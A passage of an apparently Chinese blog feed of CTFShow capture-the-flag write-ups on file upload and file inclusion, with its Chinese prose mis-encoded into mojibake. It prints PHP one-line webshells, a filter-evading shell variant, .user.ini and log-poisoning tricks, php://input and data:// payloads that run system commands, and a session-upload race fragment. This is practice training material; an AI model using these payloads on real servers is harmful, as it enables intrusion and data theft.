<span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=write, args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read, args=(session,)).start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_3.png"></p>
<p>æˆåŠŸè¯»å–åˆ°äº† flagã€‚</p>
<p>è¿‡æ»¤çš„å†…å®¹: çš„ç¡®è¿‡æ»¤ å°æ•°ç‚¹ .</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web162_4.png"></p>
<h2 id="web163"><a href="#web163" class="headerlink" title="web163"></a>web163</h2><p>åŒ<strong>web162</strong></p>
<h2 id="web164"><a href="#web164" class="headerlink" title="web164"></a>web164</h2><p>ä¸ä¼šï¼Œæš‚æ—¶ä¸åšã€‚</p>
<h2 id="web165"><a href="#web165" class="headerlink" title="web165"></a>web165</h2><p>ä¸ä¼šï¼Œæš‚æ—¶ä¸åšã€‚</p>
<h2 id="web166"><a href="#web166" class="headerlink" title="web166"></a>web166</h2><p>å‘ç°è¿™é“é¢˜ï¼Œå±…ç„¶å¯ä»¥é€šè¿‡ä¸Šä¼  zip å‹ç¼©åŒ…åŒ…å«ä¸€å¥è¯æœ¨é©¬ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166.png"></p>
<p>æ³¨æ„ï¼šContent-type: application/x-zip=compressedï¼Œéœ€è¦è¦ä¸€æ ·ï¼Œç›´æ¥æ›´æ”¹åç¼€ä¸º zip æŠ“åŒ…é»˜è®¤ä¸ºè¿™ä¸ªï¼Œæ— éœ€æ›´æ”¹ã€‚</p>
<p>ä¸Šä¼ æˆåŠŸï¼Œè®¿é—®ä¸‹è½½é“¾æ¥:</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166_1.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œå³é”®å¤åˆ¶ä¸‹è½½é“¾æ¥:</p>
<p><a href="http://945a0766-6515-46a4-bbbf-88479bf12c3c.challenge.ctf.show/upload/download.php?file=28696a28293fe023a51d363d03303616.zip">http://945a0766-6515-46a4-bbbf-88479bf12c3c.challenge.ctf.show/upload/download.php?file=28696a28293fe023a51d363d03303616.zip</a></p>
<p>ç„¶åèšå‰‘è¿æ¥,åœ¨ä¸Šä¸€çº§ç›®å½•å³å¯æ‹¿åˆ° flagã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web166_2.png"></p>
<h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167_4.png"></p>
<p>æ ¹æ®é¢˜ç›®æç¤º: httpd, æ¨æµ‹èƒ½å¦é€šè¿‡ä¸Šä¼  .htaccess å°† jpg è§£æä¸º php ä»è€Œæ‹¿åˆ° flag?</p>
<p>é¦–å…ˆå…ˆä¸Šä¼  .htaccess.jpg ï¼ŒæŠ“åŒ…å å°† jpg æ”¹ä¸º php</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167.png"></p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167_1.png"></p>
<p>ç´§æ¥ç€ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬: yjh.jpg</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[lbwnb]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167_2.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºä¸Šä¼ æˆåŠŸ:</p>
<p>ç„¶åè¯»å–flagï¼š</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web167_3.png"></p>
<h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168.png"></p>
<p>ä»æç¤ºâ€œåŸºç¡€å…æ€â€å¯ä»¥çŒœåˆ°ä¸€å¥è¯æœ¨é©¬çš„å˜ç§å†™æ³•/éªšå§¿åŠ¿å†™æ³•(ç™¾åº¦ä¸€ä¸‹):</p>
<p>ex:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web168_1.png"></p>
<h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><p>æ ¹æ®æç¤ºå¯ä»¥çœ‹åˆ°ä¸ºé«˜çº§å…æ€ä½†æˆ‘ä¸çŸ¥é“åˆ°åº•è¿‡æ»¤é‚£äº›ä¸œè¥¿æ‰€ä»¥æˆ‘çœ‹äº†å…¶ä»–å¸ˆå‚…çš„wp,éƒ½è¯´åˆ©ç”¨æ—¥å¿—è¯»å–flagã€‚ä¸”åªå‰ç«¯æ£€æŸ¥ä¸ºåªèƒ½ä¸Šä¼  zip æ–‡ä»¶ã€‚</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_5.png"></p>
<p>å‡†å¤‡ä¸¤ä¸ªæ–‡ä»¶åˆ†åˆ«æ˜¯:</p>
<p>.user.ini.zip(æŠ“åŒ…åˆ é™¤ zipå†ä¸Šä¼ ):</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">auto_append_file=/<span class="keyword">var</span>/log/nginx/access.log</span><br></pre></td></tr></table></figure>

<p>1.php.zip(æŠ“åŒ…åˆ é™¤ zipå†ä¸Šä¼ ) å†…å®¹éšæ„ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>å…ˆä¸Šä¼  .user.ini</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169.png"></p>
<p>ä¿®æ”¹å¦‚ä¸‹:</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_1.png"></p>
<p>å†ä¸Šä¼  1.php å¹¶ä¿®æ”¹:</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_2.png"></p>
<p>ç„¶åå°† ä¸€å¥è¯å†™å…¥åˆ° User-Agent: <?php eval($_POST[1]);?></p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_3.png"></p>
<p>ç„¶åè®¿é—® upload/1.php å¹¶ä¼ å‚: 1=system(â€˜tac ../flagaa.phpâ€™);</p>
<p><img src="/2021/09/10/CTFShow-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/web169_4.png"></p>
<p>å¦‚å›¾æ‰€ç¤ºå¾—åˆ°äº† flagã€‚</p>
<h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>åŒ web169</p>
]]></content>
      <categories>
        <category>CTFç¬”è®°</category>
      </categories>
  </entry>
  <entry>
    <title>CTFShow æ–‡ä»¶åŒ…å«ç¬”è®°</title>
    <url>/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="CTFShow-æ–‡ä»¶åŒ…å«ç¬”è®°"><a href="#CTFShow-æ–‡ä»¶åŒ…å«ç¬”è®°" class="headerlink" title="CTFShow æ–‡ä»¶åŒ…å«ç¬”è®°"></a>CTFShow æ–‡ä»¶åŒ…å«ç¬”è®°</h1><h2 id="web78â€”â€”æ–‡ä»¶åŒ…å«â€”â€”phpä¼ªåè®®"><a href="#web78â€”â€”æ–‡ä»¶åŒ…å«â€”â€”phpä¼ªåè®®" class="headerlink" title="web78â€”â€”æ–‡ä»¶åŒ…å«â€”â€”phpä¼ªåè®®"></a>web78â€”â€”æ–‡ä»¶åŒ…å«â€”â€”phpä¼ªåè®®</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<ol>
<li>å°è¯•æ˜¯å¦å¯ä»¥æŸ¥çœ‹ /etc/passwdä¸­çš„å†…å®¹: å‘ç°å¯ä»¥æŸ¥çœ‹</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=/etc/passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78.png"></p>
<ol start="2">
<li>å°è¯•ä½¿ç”¨ php://input åè®®:</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_1.png"></p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_2.png"></p>
<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<pre><code> 1. å°è¯•ä½¿ç”¨ php://filter/read=convert.base64-encode/resource=flag.php
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web78_3.png"></p>
<p>â€‹    base64è§£ç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:55:11</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:55:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctfshow&#123;db4b1df7-****-4633-ac61-717d14afa306&#125;&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>â€‹    å¾—åˆ°äº† flag.</p>
<h2 id="web79â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web79â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web79â€”â€”æ–‡ä»¶åŒ…å«"></a>web79â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:10:14</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:12:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå‘ç°é¢˜ç›® ä½¿ç”¨ str_replace å°†phpæ›¿æ¢ä¸ºäº† ???</p>
<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<pre><code> 1. ä½¿ç”¨ å¤§å†™ ç»•è¿‡:
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;ls&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&quot;tac flag.php&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79.png"></p>
<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<pre><code> 1. ä½¿ç”¨ mv å‘½ä»¤ å°† flag.php é‡å‘½åä¸º a.txt
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">post:</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&quot;mv flag.php a.txt&quot;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<pre><code> 2. æŸ¥çœ‹ a.txt 
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79_2.png"></p>
<p><strong>æ–¹æ³•ä¸‰ï¼š</strong></p>
<ol>
<li>ä½¿ç”¨ data:// åè®®:</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æœªä½¿ç”¨ base64 ç¼–ç </span></span><br><span class="line">?file=data:<span class="comment">//text/plain,<span class="meta">&lt;?pHp</span> system(&quot;tac f*&quot;);<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="comment">// ä½¿ç”¨ base64 ç¼–ç  </span></span><br><span class="line"><span class="comment">// <span class="meta">&lt;?php</span> system(&#x27;tac flag.php&#x27;); = base64 = PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br><span class="line">?file=data:<span class="comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web79_1.png"></p>
<h2 id="web80â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell"><a href="#web80â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell" class="headerlink" title="web80â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell"></a>web80â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 11:26:29</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº† php å’Œ data:</p>
<p><strong>æ–¹æ³•ä¸€ï¼š</strong></p>
<pre><code> 1. å°è¯•ä½¿ç”¨ php://inputï¼š
</code></pre>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?file=pHp:<span class="comment">//input</span></span><br><span class="line">postï¼š</span><br><span class="line">   	<span class="meta">&lt;?php</span> system(<span class="string">&#x27;ls&#x27;</span>);<span class="meta">?&gt;</span> / <span class="meta">&lt;?php</span> system(<span class="string">&#x27;tac fl0g.php&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80.png"></p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_1.png"></p>
<pre><code> 2. å°è¯•ä½¿ç”¨ data:// åè®®å¹¶ å¤§å†™ DATA:// ä½†ç»•è¿‡å¤±è´¥
</code></pre>
<p><strong>æ–¹æ³•äºŒï¼š</strong></p>
<pre><code> 1. åˆ©ç”¨ æ—¥å¿— shell ï¼š /var/log/nginx/access.log
 2. bp ä¸­ user-agent å†™å…¥ä¸€å¥è¯
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80_2.png"></p>
<pre><code> 3. å°è¯•è¿æ¥:
</code></pre>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web80_3.png"></p>
<p>â€‹    4. æŸ¥æ‰¾ flagï¼ˆçœç•¥ï¼‰</p>
<h2 id="web81â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell"><a href="#web81â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell" class="headerlink" title="web81â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell"></a>web81â€”â€”æ–‡ä»¶åŒ…å«â€”â€”æ—¥å¿—shell</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<ol>
<li>å¯ä»¥å‘ç°æ–‡ä¸­å°† php/data/: éƒ½æ›¿æ¢ä¸ºäº† ???;</li>
<li>å°è¯•æ˜¯å¦èƒ½æŸ¥çœ‹ æœåŠ¡å™¨æ—¥å¿—: ?file=/var/log/nginx/access.log â€” æˆåŠŸ</li>
</ol>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81.png"></p>
<p>   3.å°†ä¸€å¥è¯æœ¨é©¬ å†™å…¥åˆ° User Agentå½“ä¸­: HackBar/Burp:</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_1.png"></p>
<p>   4.å†æ¬¡æŸ¥çœ‹æ—¥å¿—ï¼Œæ—¥å¿—æ˜¯å¦åŒ…å«äº† ä¸€å¥è¯: â€” æœ‰</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_2.png"></p>
<p>   5.èšå‰‘/èœåˆ€è¿æ¥:</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_3.png"></p>
<p>   æŸ¥æ‰¾flag:</p>
<p><img src="/2021/07/27/CTFShow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/web81_4.png"></p>
<h2 id="web82â€”â€”æ–‡ä»¶åŒ…å«"><a href="#web82â€”â€”æ–‡ä»¶åŒ…å«" class="headerlink" title="web82â€”â€”æ–‡ä»¶åŒ…å«"></a>web82â€”â€”æ–‡ä»¶åŒ…å«</h2><p>æºç :</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 19:34:45</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = str_replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>åˆ†æï¼š</strong></p>
<p>æŠŠ php,data,:, . éƒ½æ›¿æ¢ä¸ºäº† ??? ; è¿™äº›åè®®éƒ½ç”¨ä¸äº†å¯ä»¥è€ƒè™‘å°è¯•ç”¨ sessionå¯¹è¯æ–‡ä»¶åŒ…å«</p>
<p>â€‹    1.ç¼–è¾‘ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;ç›®æ ‡URL&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2333&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

